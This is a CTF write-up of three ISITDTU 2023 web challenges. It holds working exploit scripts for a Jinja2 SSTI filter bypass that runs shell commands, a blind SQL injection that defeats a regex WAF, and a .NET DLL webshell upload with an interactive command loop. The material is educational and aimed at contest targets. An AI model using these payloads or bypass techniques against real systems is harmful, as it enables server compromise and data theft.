---
title: "ISITDTU CTF 2023"
description: "Writeup for web challenges in ISITDTU CTF 2023"
summary: "Writeup for web challenges in ISITDTU CTF 2023"
categories: ["Writeup"]
tags: ["Web Exploitation", "CTF"]
#externalUrl: ""
date: 2023-10-15
draft: false
---

<!-- .slide: style="font-size: 12px;" -->


## thru_the_filter_test_flag
**Author:** onsra
**Description:** This challenge gives us a website that can be exploited by SSTI. 

Review code:

```python!
from flask import Flask, request, render_template_string,redirect

app = Flask(__name__)
def check_payload(payload):
    blacklist = ['import', 'request', 'init', '_', 'b', 'lipsum', 'os', 'globals', 'popen', 'mro', 'cycler', 'joiner', 'u','x','g','args', 'get_flashed_messages', 'base', '[',']','builtins', 'namespace', 'self', 'url_for', 'getitem','.','eval','update','config','read','dict']
    for bl in blacklist:
        if bl in payload:
            return True
    return False
@app.route("/")
def home():
    if request.args.get('c'):
        if(check_payload(ssti)):
            return "HOLD UP !!!"
        else:
            return render_template_string(request.args.get('c'))
    else:
        return redirect("""/?c={{ 7*7 }}""")


if __name__ == "__main__":
    app.run()
```

* The code shows that basic Server Side Include Injection (SSTI) vulnerability is `{{ 7 * 7 }}` 
* But function `check_payload` already filtered so many and after looking the blacklist, i thought we need some special trick bypassing this filter.

Trick Bypass: **attr + format**

- Because they filter most of word that can ssti so we need to use attr and format to generate the string to bypass this.
- Example: `attr("%c%c%c%c%c%c%c%c%c%c%c%c"|format(99,97,116,32,102,108,97,103,46,116,120,116))` is generate to `cat flag.txt`
- The final exploit script:
``` python!
import requests

def gen(p):
    num_c = len(p)

    chrs = ""

    for i in p:
        chrs += str(ord(i)) + ","
    chrs = chrs[:-1]

    return f'attr(\"{"%c"*num_c}\"|format({chrs}))'

# Define the URL and query parameters
url = 'http://localhost:1338'
payload = f'{{()|{gen("__class__")}|{gen("__base__")}|{gen("__subclasses__")}() | {gen("__getitem__")}(367) | {gen("__init__")} | {gen("__globals__") } | {gen("__getitem__")}("o""s")|attr("po""pen")("%c%c%c%c%c%c%c%c%c%c%c%c"|format(99,97,116,32,102,108,97,103,46,116,120,116))|attr("re""ad")()}}'
params = {
    'c': payload
}

# Define the headers
headers = {
    'Host': 'localhost:1338',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'close'
}

# Send the GET request
response = requests.get(url, params=params, headers=headers)

# Check the response
if response.status_code == 200:
    print(response.text)
else:
    print(f"Request failed with status code: {response.status_code}")

#ISITDTU{tough_times_create_tough_guys!@@%#0@}
```
Flag: `ISITDTU{tough_times_create_tough_guys!@@%#0@}`

> Note: After the competition, i found other solutions from other CTF players that are so cool.
> - A tool from Chinese dude i just found from this CTF, all you need is throw the url & parameter into this: [Link](https://github.com/Marven11/Fenjing) 
> ```
> pip install fenjing
> python3 -m fenjing crack --url 'http://34.124.244.195:1338/' --method GET --inputs "c"
> $>> cat /app/flag.txt
> ```
> - And another solution so crazy just like his nickname :smile: 

![image](https://hackmd.io/_uploads/SJjQjfbNT.png)



quibuu
---
**Author:** onsra
**Description:** The challenge give us a `app.py` and a database name `hehe.db`. So it maybe SQL injection.

Review code:

`App.py`:
```python!
from flask import Flask, render_template, request
import random
import re
import urllib.parse
import sqlite3

app = Flask(__name__)


def waf_cuc_chill(ans):
    # idk, I thought too much of a good thing
    ans = urllib.parse.quote(ans)
    pattern = re.compile(r'(and|0r|substring|subsrt|if|case|cast|like|>|<|(?:/\%2A.*?\%2A/)|\\|~|\+|-|when|then|order|name|url|;|--|into|limit|update|delete|drop|join|version|not|hex|load_extension|round|random|lower|replace|likely|iif|abs|char|unhex|unicode|trim|offset|count|upper|sqlite_version\(\)|#|true|false|max|\^|length|all|values|0x.*?|left|right|mid|%09|%0A|%20|\t)', re.IGNORECASE)
    
    if pattern.search(ans):
        return True
    return False

@app.route("/", methods=["GET"])
def index():
    ran = random.randint(1, 11)
    id, ans= request.args.get("id", default=f"{ran}"), request.args.get("ans", default="")

    if not (id and str(id).isdigit() and int(id) >= 1 and int(id) <= 1301):
        id = 1
    

    db = sqlite3.connect("hehe.db")
    cursor = db.execute(f"SELECT URL FROM QuiBuu WHERE ID = {id}")
    img = cursor.fetchone()[0]

    if waf_cuc_chill(ans):
        return render_template("hack.html")
    
    cursor = db.execute(f"SELECT * FROM QuiBuu where ID = {id} AND Name = '{ans}'")
    result = cursor.fetchall()

    check = 0
    if result != []:
        check = 1
    elif result == [] and ans != "" :
        check = 2

    return render_template("index.html", id=id, img=img, ans=ans, check=check)

if __name__ == "__main__":
    app.run()
```

The database gives many ID and after searching a little bit, I found the flag in ID 1337.
![image](https://hackmd.io/_uploads/S1MvgpZN6.png)
And we can inject into the id but also need to bypass the function `waf_cuc_chill`. 

**Idea:**
> - Inject id and create a new table name F that concat with table QuiBuu and choose the id 1337 to get the flag.
> - This need to brute the flag in url (Blind SQL Injection) to get the real flag in the column URL. In this challenge i use instr ([Link](https://www.sqlite.org/lang_corefunc.html)). 
> Note: I didn't see the author only filter `substring` and `subsrt` but left the `substr` until the author talk that to me after this CTF end lul.

Final exploit script:

```python!
import requests
import string

# payload = "'OR SELECT * FROM QuiBuu WHERE ID = 1 UNION SELECT 1,2,F.`3` FROM (SELECT 1,2,3 UNION SELECT * FROM QuiBuu WHERE id=1337)F/*".replace(" ","%0c")
# payload = "abc'OR SELECT GROUP_CONCAT(F.`3`) FROM (SELECT 1,2,3 UNION SELECT * FROM QuiBuu WHERE id=1337)F".replace(" ","%0c")
# payload = "a' OR (SELECT instr((SELECT GROUP_CONCAT(F.`3`) FROM ( SELECT 1,2,3 UNION SELECT * FROM QuiBuu WHERE id=1337)F),\"ISITDTU\"))/*".replace(" ","%0c")
flag = ""
url = "http://20.198.223.134:1301/?id=1&ans="


while True:
  for c in string.printable:
    if c not in ['*','+','.','?','|', '#', '&', '$']:
        payload = ("a' OR (SELECT instr((SELECT GROUP_CONCAT(F.`3`) FROM ( SELECT 1,2,3 UNION SELECT * FROM QuiBuu WHERE id=1337)F),\""+flag+c+"\"))/*").replace(" ","%0c")
        r = requests.get(url + payload, stream=True) 
        if 'Haha QuiBuu!' in r.text:
            print(f" [+] Brute flag successfully : {flag+c}")
            flag += c
```
After i exploit in my local i get that:
![image](https://hackmd.io/_uploads/H1yY46bNa.png)
Done! Let's go!! 
Let take the flag from the real url. Flag in the google drive lul: [https://drive.google.com/file/d/1KWvSVho_Yl6kQ2f6iwGPudfh2pYPvDN1/view](https://drive.google.com/file/d/1KWvSVho_Yl6kQ2f6iwGPudfh2pYPvDN1/view)
Flag: `ISITDTU{I_SURE_U_QU1BUU_K3K3}`

## Dotnet101

**Author:** Taidh

I can't solve this challenge so i ask the author about the idea and the script exploit to learn more about `Dotnet`.

Review code:
Structure of this challenge looks like this:
![image](https://hackmd.io/_uploads/rkNGDTb46.png)


Idea:
- The second parameter in **Path.Combine()** can be controlled, so we can pass an absolute path => Bypass check ..
- To obtain the running path, access **/Test/zeroTestPage?debug=1** because the file **file_does_not_exist** does not exist, and in the **Web.config**, **<customErrors mode="Off"/>** is set, so the error is displayed and contains the path to the webroot (C:\inetpub\wwwroot).
- Note that all folders and files have only "ReadAndExecute" permissions except for Uploads (FullControl) and Test (Modify) because I set permissions for the entire **wwwroot** directory and then only edit permissions for the **Uploads** and **Test** folders, so the **zeroTestPage.aspx** file will keep "ReadAndExecute" permission.
- Create an arbitrary DLL file (webshell) with the class named **ReadNoFlag**, and the file name must start with the letter 'z', with the second character in the file name being the character following 'e' (any character from f to z, case-insensitive). Explanation: Because "zeroTestPage.aspx" is set to have only "ReadAndExecute" permission => no delete permission, when the file is created as described, it will be sorted below the "zeroTestPage.aspx" file when extracted. When the program attempts to delete the "zeroTestPage.aspx" file, it stops, and in the end, we have just uploaded without being deleted.
- Zip the file and upload it to the "C:\inetpub\wwwroot\Test" folder.

Example:
> zexploit.dll (webshell file)
> zeroTestPage.aspx (zeroTestPage.aspx file in Test folder)
> 
> z = z
> e = e
> x > r => it will be sorted below zeroTestPage.aspx file.

Final exploit script:
```python!
import requests
import re

url = 'http://40.88.10.36'

sess = requests.Session()

def Login(username,password):
    response = sess.get(url + '/Login')
    view_state = response.text.split('id="__VIEWSTATE" value="')[1].split('"')[0]
    event_validation = response.text.split('id="__EVENTVALIDATION" value="')[1].split('"')[0]

    login_data = {
        '__VIEWSTATE': view_state,
        '__EVENTVALIDATION': event_validation,
        'txtUsername': username,
        'txtPassword': password,
        'btnLogin': 'Login'
    }
    r = sess.post(url + '/Login', data=login_data)
    print("[-] Login success!")

def uploadDLL(filename):
    response = sess.get(url + '/Admin/UploadImage')

    view_state = response.text.split('id="__VIEWSTATE" value="')[1].split('"')[0]
    event_validation = response.text.split('id="__EVENTVALIDATION" value="')[1].split('"')[0]
    data = {
        '__VIEWSTATE': view_state,
        '__EVENTVALIDATION': event_validation,
        'folderName':'C:\inetpub\wwwroot\Test', #
        'btnConvert': 'Upload'
    }

    test_file = open(filename, "rb")
    upload_data = {'fileUpload': open(filename,'rb')}
    r = sess.post(url + "/Admin/UploadImage", data=data, files = {"fileUpload": test_file})
    print("[-] Uploading DLL...")

def trigger(cmd):
    data = {
        "fileName":"../Test/zExploit",
        "cmd":cmd
    }
    r = sess.post(url + '/Admin/DynamicPage', data=data)
    print(r.text)

Login('admin','admin')
uploadDLL("zExploit.zip")

print("[-] Done, enjoy the shell")
while True:
    cmd = input("$ ")
    trigger(cmd)
```

